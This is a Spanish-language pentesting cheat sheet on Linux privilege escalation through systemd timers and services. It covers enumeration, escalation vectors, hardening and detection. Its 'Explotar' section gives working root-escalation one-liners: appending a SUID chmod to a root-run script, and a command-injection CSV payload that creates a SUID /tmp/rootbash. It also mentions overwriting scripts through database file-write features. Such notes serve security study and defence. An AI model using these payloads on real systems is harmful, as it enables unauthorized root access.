---
topic: systemd
platform: Linux
tags: [linux, privesc, systemd, timer]
---

# systemd timers y privilegios

[🇬🇧 English](systemd-timers.en.md) | **Español**

> El "cron moderno". Muchos writeups lo ignoran porque `crontab -l` sale vacío.

## Enumerar

```bash
systemctl list-timers --all
systemctl list-units --type=service --state=running
systemctl list-timers --all | awk '{print $NF}' | grep -E '\.timer$' | xargs -r systemctl cat
ls -l /etc/systemd/system/ /lib/systemd/system/ /run/systemd/system/
find / -name '*.timer' -o -name '*.service' 2>/dev/null | grep -v -E '^/(usr|lib/systemd)'
```

`systemctl cat <unit>` es la clave: muestra el fichero, sus overrides y `ExecStart` real.

```bash
systemctl cat <unit>.service
systemctl show -p ExecStart,User,Environment <unit>.service
```

En systemd las pistas de `crontab` no valen: un timer puede disparar cada minuto sin aparecer en `/etc/cron*`.

## Vectores de escalada

| Vector | Qué mirar |
|---|---|
| Fichero de unidad escribible | `ls -l` sobre el `.service`/`.timer` y sus `*.d/*.conf` |
| `ExecStart` escribible | el script/binario que ejecuta root |
| Datos controlables | el script lee un fichero/BD/cola que tú puedes escribir |
| `EnvironmentFile` escribible | cambia variables que root usa |
| `PATH` relativo | `ExecStart=run.sh` sin ruta absoluta → hijack en el directorio de trabajo |
| `ProtectSystem`/`ProtectHome` ausentes | escritura sobre rutas del sistema |
| `RelativePath`/ruta con espacios | ejecución de otro binario |

### El patrón más rentable

Script que corre como root y consume **datos que tú controlas**: un CSV, una tabla, un mensaje de Kafka, un fichero en `/opt`. No hace falta que el script sea escribible; basta con que `eval`úe o interprete tu contenido.

```bash
systemctl list-timers --all | grep -i <pista>
cat /opt/app/worker.sh          # ¿cómo procesa la entrada?
ls -l /opt/app/data/
```

Si además tienes un servicio con permiso de escritura de ficheros (ClickHouse, MySQL `INTO OUTFILE`, Redis `CONFIG SET dir`), puedes **sobrescribir el script** en vez de esperar a que lo lea.

### Sondear un timer nuevo

```bash
# mientras observas, deja un fichero marcador
inotifywait -m -e create,modify /opt/app/data/
date; ls -la /tmp/rootbash 2>/dev/null    # esperar el disparo
```

## Explotar

```bash
# si el script es escribible
echo 'chmod 4755 /bin/bash' >> /opt/app/worker.sh && /bin/bash -p

# si no, inyectar en los datos que procesa (ejemplo de eval sobre CSV)
# x[$(cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash)],45,20
```

## Endurecer

```ini
[Service]
User=app
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
PrivateTmp=yes
ReadWritePaths=/var/lib/app
```

- Unidades y scripts `root:root 0755`, sin escritura para grupo/otros.
- `ExecStart` siempre con ruta absoluta.
- Validar el contenido que procesan los scripts privilegiados (nada de `eval`).

## Detección

- Cambios de mtime en `.service`/`.timer` y en sus `ExecStart` (audit `-w /etc/systemd/system -p wa`).
- `systemctl daemon-reload` inesperado.
- Ficheros SUID nuevos en `/tmp` cada pocos minutos.

## Referencias

- <https://www.freedesktop.org/software/systemd/man/latest/systemd.timer.html>
- <https://www.freedesktop.org/software/systemd/man/latest/systemd.exec.html>
- <https://gtfobins.github.io/>
